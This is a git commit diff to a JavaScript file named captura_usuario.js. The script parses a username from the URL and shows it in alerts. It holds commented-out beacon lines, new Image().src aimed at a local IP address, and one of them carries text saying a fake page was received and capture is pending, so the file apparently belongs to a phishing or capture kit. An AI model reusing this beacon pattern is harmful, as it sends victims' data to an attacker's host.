a8dcc03fb9c920fc2615890050332a559d6ae652
rodrigorochapinto <46836803+rodrigorochapinto@users.noreply.github.com>
2019-01-21 12:02:25 -0200

    Update captura_usuario.js

--- js/captura_usuario.js
+++ js/captura_usuario.js
@@ -1,30 +1,16 @@
-//Captura todo o conteudo da URL
 var url   = window.location.search.replace("?", "");
-
-var y = url.split('?');
-
-var x = y.split('&');
-
-alert(y[0] + y[1]);
-
-//Recupera o nome do usuario enviado por GET
-
-//Retira o %20 referente aos espaços e substitui pos underline
-//str = array.usuario
-//var busca = "%20"; 
-//var strbusca = eval('/'+busca+'/g');
-//str2 = str.replace(strbusca, "_");
-
-//alert('teste');
+var items = url.split("&");
+var array = {
+'usuario' : items[0],
+}
+str = array.usuario
+var busca = "%20"; 
+var strbusca = eval('/'+busca+'/g');
+str2 = str.replace(strbusca, " ");
+alert(str2);
 
 
-//new Image().src = "http://192.168.0.123/?=" + str2 +"_Recebeu_a_pagina_falsa_aguarde_captura....";
-
- 
+alert(str2)
 
 
-
-// Para Testes
-//alert(str2);
-//alert('captura usuario / editar arquivo captura_usuario.js')
-
+// new Image().src = "http://192.168.0.123/?=" + retorno
